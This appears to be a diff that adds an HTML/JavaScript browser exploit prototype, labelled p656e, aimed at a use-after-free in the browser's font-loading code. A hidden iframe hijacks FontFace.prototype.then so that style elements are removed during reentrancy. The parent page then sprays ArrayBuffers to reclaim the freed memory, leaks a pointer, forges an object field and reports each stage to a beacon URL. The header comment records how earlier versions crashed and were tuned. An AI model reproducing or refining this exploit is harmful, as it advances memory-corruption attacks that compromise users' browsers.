@@ -1,0 +1,295 @@
+<!--
+  p656e: iframe forge, staged beacons, parent-side analysis (v2 of p656d)
+
+  p656d bench result: 78 consecutive WebProcess crashes. Only 1 run reached
+  TRAP1; died before analysis. Root causes identified:
+    1. document.fonts.delete(this) inside the IFRAME trap -> premature free
+       mid-reentrancy (p655 proved iframe frees the orphan WITHOUT delete;
+       the delete is only needed in the MAIN document context)
+    2. sty2 referenced by trap2 getter but declared inside a callback scope
+       -> ReferenceError inside engine reentrancy
+    3. child-side analysis read parent-realm DataViews
+
+  v2 redesign:
+    - NO delete(this) in iframe traps (p655 pattern)
+    - sty2 declared at child IIFE top level
+    - ALL buffer analysis in the PARENT realm
+    - staged beacons for crash localization:
+      START / IFRAME / ARM1 / TRAP1 / P1-* / ARM2 / TRAP2 / P2-* / NAV / D1-* / D2-*
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p656e</title></head>
+<body>p656e: iframe forge staged
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 2) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P656E-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', 'staged');
+flush();
+
+// --- Parent state ONLY parent touches ---
+var bufs1 = [], bufs2 = [];
+var hit1 = -1, hit2 = -1;
+var T1_lo = 0, T1_hi = 0;
+var stage = 0; // 0=idle 1=await trap1 2=analyzing1 3=await trap2 4=analyzing2 5=teardown
+
+window.spray1 = function() {
+  for (var i = 0; i < 80; i++) {
+    var ab = new ArrayBuffer(192);
+    var dv = new DataView(ab);
+    dv.setUint32(0x00, 2, true);
+    dv.setUint32(0x04, 0xAAAA0001, true);
+    bufs1.push({ dv: dv });
+  }
+};
+window.spray2 = function(tlo, thi) {
+  for (var i = 0; i < 80; i++) {
+    var ab = new ArrayBuffer(192);
+    var dv = new DataView(ab);
+    dv.setUint32(0x00, 0, true);        // seed rc=0 -> 1 after addClient
+    dv.setUint32(0x04, 0xCCCC0005, true);
+    dv.setUint32(0x58, tlo, true);      // FORGE m_table = T1
+    dv.setUint32(0x5C, thi, true);
+    bufs2.push({ dv: dv });
+  }
+};
+window.noteTrap = function(n) {
+  emit('TRAP' + n, 'stage=' + stage + ' b1=' + bufs1.length + ' b2=' + bufs2.length);
+  flush();
+  if (n === 1) { stage = 2; setTimeout(analyze1, 150); }
+  if (n === 2) { stage = 4; setTimeout(analyze2, 150); }
+};
+
+function analyze1() {
+  try {
+    hit1 = -1;
+    for (var i = 0; i < bufs1.length; i++) {
+      if (bufs1[i].dv.getUint32(0, true) !== 2) { hit1 = i; break; }
+    }
+    if (hit1 < 0) {
+      for (var j = 0; j < bufs1.length; j++) {
+        if (bufs1[j].dv.getUint32(0x58, true) !== 0 || bufs1[j].dv.getUint32(0x5C, true) !== 0) { hit1 = j; break; }
+      }
+    }
+    if (hit1 < 0) { emit('P1-MISS', 'no reclaim — stopping (no teardown)'); flush(); return; }
+
+    var dv1 = bufs1[hit1].dv;
+    T1_lo = dv1.getUint32(0x58, true);
+    T1_hi = dv1.getUint32(0x5C, true);
+    emit('P1-HIT', 'hit=' + hit1 + ' T1=' + hex32(T1_hi) + hex32(T1_lo) +
+      ' W1=' + hex32(dv1.getUint32(0x6C, true)) + hex32(dv1.getUint32(0x68, true)));
+    flush();
+    if (T1_lo === 0 && T1_hi === 0) { emit('P1-FAIL', 'T1 null — stop'); flush(); return; }
+    stage = 3;
+    try { ifrArm2(); } catch(e) { emit('ARM2-ERR', String(e).slice(0,60)); flush(); }
+  } catch(e) { emit('P1-FATAL', String(e).slice(0,120)); flush(); }
+}
+
+function analyze2() {
+  try {
+    hit2 = -1;
+    for (var i = 0; i < bufs2.length; i++) {
+      if (bufs2[i].dv.getUint32(0, true) !== 0) { hit2 = i; break; }
+    }
+    if (hit2 < 0) {
+      for (var j = 0; j < bufs2.length; j++) {
+        if (bufs2[j].dv.getUint32(0x68, true) !== 0 || bufs2[j].dv.getUint32(0x6C, true) !== 0) { hit2 = j; break; }
+      }
+    }
+    if (hit2 < 0) { emit('P2-MISS', 'no reclaim — stopping (no teardown)'); flush(); return; }
+
+    var dv2 = bufs2[hit2].dv;
+    var rc2 = dv2.getUint32(0, true);
+    var held = (dv2.getUint32(0x58, true) === T1_lo && dv2.getUint32(0x5C, true) === T1_hi);
+    emit('P2-HIT', 'hit=' + hit2 + ' rc=' + rc2 + ' forge=' + held);
+    emit('P2-D', '+58=' + hex32(dv2.getUint32(0x5C, true)) + hex32(dv2.getUint32(0x58, true)) +
+      ' W2=' + hex32(dv2.getUint32(0x6C, true)) + hex32(dv2.getUint32(0x68, true)));
+    flush();
+    if (!held) { emit('FORGE-FAIL', 'stop — teardown on failed forge is pointless'); flush(); return; }
+    stage = 5;
+    setTimeout(doTeardown, 250);
+  } catch(e) { emit('P2-FATAL', String(e).slice(0,120)); flush(); }
+}
+
+var ifr = null;
+function ifrArm2() { try { ifr.contentWindow.arm2(); } catch(e) { emit('ARM2-CALL-ERR', String(e).slice(0,60)); } }
+
+function doTeardown() {
+  try {
+    var dv1 = bufs1[hit1].dv;
+    var dv2 = bufs2[hit2].dv;
+    var snap1 = [], snap2 = [];
+    for (var j = 0; j < 192; j += 4) { snap1.push(dv1.getUint32(j, true)); snap2.push(dv2.getUint32(j, true)); }
+
+    emit('PRE-NAV', 'rc1=' + dv1.getUint32(0, true) + ' rc2=' + dv2.getUint32(0, true));
+    ifr.contentWindow.location.replace('about:blank');
+    emit('NAV', 'sent');
+    flush();
+
+    setTimeout(function() {
+      try { ifr.remove(); } catch(e) {}
+      ifr = null;
+
+      var fresh = [];
+      var pollN = 0;
+      var s1 = { changed: false, freed: false }, s2 = { changed: false, freed: false };
+
+      function poll() {
+        pollN++;
+        for (var k = 0; k < 8; k++) {
+          var ab = new ArrayBuffer(192);
+          var dvf = new DataView(ab);
+          dvf.setUint32(0x04, 0xF7EE0659, true);
+          fresh.push(dvf);
+        }
+
+        function check(dv, snap, label, st) {
+          var rc = dv.getUint32(0, true);
+          var mk = dv.getUint32(4, true);
+          var changed = [];
+          for (var j = 0; j < 192; j += 4) {
+            var cur = dv.getUint32(j, true);
+            if (cur !== snap[j / 4]) {
+              changed.push('+' + j.toString(16) + ':' + hex32(snap[j/4]) + '>' + hex32(cur));
+              snap[j / 4] = cur;
+            }
+          }
+          if (mk === 0xF7EE0659 && !st.freed) {
+            st.freed = true;
+            emit(label + '-FREED', 'slot re-taken by fresh spray');
+          } else if (changed.length && !st.changed) {
+            st.changed = true;
+            emit(label + '-CHANGED', 'rc=' + rc + ' diffs=' + changed.length);
+            emit(label + '-DIFFS', changed.slice(0, 12).join(' '));
+            var full = [];
+            for (var j2 = 0; j2 < 192; j2 += 8) {
+              full.push('+' + j2.toString(16) + '=' + hex32(dv.getUint32(j2+4, true)) + hex32(dv.getUint32(j2, true)));
+            }
+            emit(label + '-FULL', full.join(' '));
+          }
+        }
+
+        check(dv1, snap1, 'D1', s1);
+        check(dv2, snap2, 'D2', s2);
+
+        if (pollN === 1 || pollN === 5 || pollN === 15 || pollN === 30) {
+          emit('POLL', 'n=' + pollN +
+            ' d1(rc=' + dv1.getUint32(0,true) + ')' +
+            ' d2(rc=' + dv2.getUint32(0,true) + ')');
+          flush();
+        }
+
+        if (pollN < 40) { setTimeout(poll, 100); }
+        else {
+          emit('VERDICT',
+            'D1 ' + (s1.freed ? 'FREED' : s1.changed ? 'DESTROYED' : 'STABLE') +
+            ' | D2 ' + (s2.freed ? 'FREED' : s2.changed ? 'DESTROYED' : 'STABLE'));
+          emit('ALIVE', 'end');
+          flush();
+        }
+      }
+      setTimeout(poll, 80);
+    }, 600);
+  } catch(e) { emit('TD-FATAL', String(e).slice(0,120)); flush(); }
+}
+
+// --- Hidden iframe: forge only, minimal child logic ---
+ifr = document.createElement('iframe');
+ifr.style.display = 'none';
+document.body.appendChild(ifr);
+
+var iDoc = ifr.contentDocument;
+iDoc.open();
+iDoc.write([
+  '<!DOCTYPE html><html><head></head><body>',
+  '<script>',
+  '(function() {',
+  '  var phase = 0;',
+  '  var sty1 = null, sty2 = null;   // top-level scope, visible to traps',
+  '  function p(t, m) { try { parent.noteTrap; } catch(e) {} }',
+  '',
+  '  sty1 = document.createElement("style");',
+  '  sty1.textContent = "@font-face { font-family: sa; src: local(Arial); unicode-range: U+0042; }";',
+  '  document.head.appendChild(sty1);',
+  '',
+  '  var ffA = new FontFace("fa", "local(Helvetica)", { unicodeRange: "U+0041" });',
+  '  document.fonts.add(ffA);',
+  '  void ffA.loaded;',
+  '',
+  '  Object.defineProperty(FontFace.prototype, "then", {',
+  '    configurable: true,',
+  '    get: function() {',
+  '      if (phase === 1) {',
+  '        phase = 0;',
+  '        sty1.remove();',
+  '        document.body.offsetHeight;',
+  '        try { parent.spray1(); } catch(e) {}',
+  '        try { parent.noteTrap(1); } catch(e) {}',
+  '        return undefined;',
+  '      }',
+  '      if (phase === 2) {',
+  '        phase = 0;',
+  '        sty2.remove();',
+  '        document.body.offsetHeight;',
+  '        try { parent.spray2(window.__tlo, window.__thi); } catch(e) {}',
+  '        try { parent.noteTrap(2); } catch(e) {}',
+  '        return undefined;',
+  '      }',
+  '      return undefined;',
+  '    },',
+  '    set: function() {}',
+  '  });',
+  '',
+  '  window.arm2 = function() {',
+  '    sty2 = document.createElement("style");',
+  '    sty2.textContent = "@font-face { font-family: sb; src: local(Arial); unicode-range: U+0043; }";',
+  '    document.head.appendChild(sty2);',
+  '    var ffB = new FontFace("fb", "local(Helvetica)", { unicodeRange: "U+0044" });',
+  '    document.fonts.add(ffB);',
+  '    void ffB.loaded;',
+  '    window.__tlo = parent.T1_lo; window.__thi = parent.T1_hi;',
+  '    phase = 2;',
+  '    try { parent.emitChild("ARM2", "sent"); } catch(e) {}',
+  '    document.fonts.load("1em fb, sb", "CD");',
+  '  };',
+  '',
+  '  phase = 1;',
+  '  try { parent.emitChild("ARM1", "sent"); } catch(e) {}',
+  '  document.fonts.load("1em fa, sa", "AB");',
+  '})();',
+  '<\/script></body></html>'
+].join('\n'));
+iDoc.close();
+
+emit('IFRAME', 'created');
+flush();
+
+window.T1_lo = 0; window.T1_hi = 0; // updated by analyze1 via closure vars
+// keep them in sync for child arm2:
+var _syncT1 = setInterval(function() { window.T1_lo = T1_lo; window.T1_hi = T1_hi; }, 30);
+setTimeout(function() { clearInterval(_syncT1); }, 30000);
+
+window.emitChild = function(tag, msg) { emit(tag, msg); flush(); };
+
+})();
+</script>
+</body></html>
